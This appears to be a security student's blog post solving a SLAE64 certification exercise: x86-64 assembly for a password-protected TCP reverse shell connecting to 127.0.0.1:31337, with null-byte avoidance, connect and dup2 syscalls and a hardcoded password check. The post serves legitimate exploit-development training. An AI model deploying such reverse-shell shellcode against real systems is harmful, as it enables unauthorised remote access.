title: Password Protected Reverse Shell Shellcode
date: 2018-04-22
published: true 
summary: My solution to SLAE64 Exam Question 2
tags: shellcode, exploit, assembly

#Password Protected Reverse Shell Shellcode

This is my solution to the second exam question of the SLAE64 certification. This exercise was to write a password-protected tcp reverse shell. Again, Vivek (the instructor) provides a lot of this sample code in the class materials, so a lot of the instructions are reused from that code. This exercise mainly consisted of removing null bytes from the output and adding logic to password protect the shell.  

I basically reused most of my solution to exam question 1 for this exercise. Again, I used the remote port ```31337``` so we would really be hacking. I already bound the bind shell to localhost in the previous exercise, so I didn't really have to change the ```sockaddr``` structure initialization. Again, I used the xor value of ```0x23232323``` to avoid null bytes in that ```mov``` instruction. The code to create this structure on the stack is shown below:

        ; create sockaddr_in structure on stack
        ; bzero(&server.sin_zero, 8)
        push rdx
        ;zero sin_addr, sin_port, sin_family
        push rdx
        ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
        ; this is same as we used in our localhost-only bind shell
        ; xor with constant for now to decode
        mov dword [rsp+4], 0x2223235c
        xor dword [rsp+4], 0x23232323
        ; server.sin_port = htons(31337)
        mov word [rsp+2], 0x697a
        ; server.sin_family = AF_INET
        ; just need to move byte since we already zeroed buffer
        mov byte [rsp], 0x2

The key difference in this exercise is that instead of a ```bind```, ```listen```, then ```accept``` syscall, we just have to make a single ```connect``` syscall. The code I used to do this is below:

        ; connect syscall
        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 42
        xor rax, rax
        mov al, 42
        mov rsi, rsp
        mov dl, 16
        syscall

        ; duplicate sockets
        ; dup2 (new, old)
        ; set client socket as stdout, stdin (fd 0,1)
        xor rax, rax
        mov al, 33
        xor rsi, rsi
        syscall

        xor rax, rax
        mov al, 33
        xor rsi, rsi
        mov sil, 1
        syscall

        ; password check code starts here

Since the rest of my solution was basically the same as problem 1, there weren't really additional nulls to eliminate from the raw output. I used the same password check routine - for completeness though it is included below:

        ; password check code starts here - 7 byte password + newline 
        read_password: ; read syscall - read onto stack ; allocate space on stack sub rsp, 8
                ; make syscall
                ; read(fd, *buf, count)
                xor rax, rax
                xor rdi, rdi
                mov rsi, rsp
                xor rdx, rdx
                mov dl, 8
                syscall

        ;compare password with mrtfsh1
        compare_password:
                mov rbx,0x0a3168736674726d
                mov rdi,[rsp]
                cmp rbx,rdi
                jne exit

        ; execve code starts here - mostly provided in course

After all this, my shellcode came out to 157 bytes, with no null characters. I was pretty happy with this: 

![bytecount_nullcount](/static/blog/2018/SLAE64/2/bytecount_nullcount.png)

I ran it using the same small C program as before. When I entered the correct passcode, the program allowed me to obtain a shell:

![correct](/static/blog/2018/SLAE64/2/reverse_shell.png)

When I entered an incorrect passcode, the program crashed as I didn't include any error handling:

![incorrect](/static/blog/2018/SLAE64/2/incorrect.png)

![incorrect2](/static/blog/2018/SLAE64/2/incorrect2.png)

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/2>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification.* 

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*